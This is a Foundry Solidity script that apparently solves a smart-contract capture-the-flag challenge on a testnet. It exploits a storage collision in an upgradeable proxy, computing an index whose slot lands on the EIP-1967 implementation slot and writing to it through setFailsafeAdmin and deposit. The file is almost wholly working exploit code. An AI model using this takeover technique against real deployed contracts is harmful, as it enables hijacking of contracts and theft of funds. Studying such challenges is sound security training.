// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Task.sol";
import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    // 0x3D7D228acED8600E813375D0B9CbE98625457738 Basket
    // 0x3Bc900E9231D524DB4fedDB993E0f198FC72e880 Proxy

    Buckets public bucketsInstance =
        Buckets(payable(0x3D7D228acED8600E813375D0B9CbE98625457738));

    BucketsProxy public bucketsProxyInstance =
        BucketsProxy(payable(0x3Bc900E9231D524DB4fedDB993E0f198FC72e880));

    // cast storage 0x3Bc900E9231D524DB4fedDB993E0f198FC72e880 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $MUMBAI_URL
    // keccak256(abi.encode(uint256(0))) = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
    function run() external {
        uint256 implementer = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        uint256 changeAddress = uint256(implementer) -
            uint256(keccak256(abi.encode(uint256(0))));

        vm.startBroadcast();
        console.log(
            "Contract totalSupply: ",
            Buckets(address(bucketsProxyInstance)).totalSupply()
        );

        bucketsProxyInstance.setFailsafeAdmin(changeAddress + 1);

        Buckets(address(bucketsProxyInstance)).deposit{value: 1}(changeAddress);
        vm.stopBroadcast();
    }
}
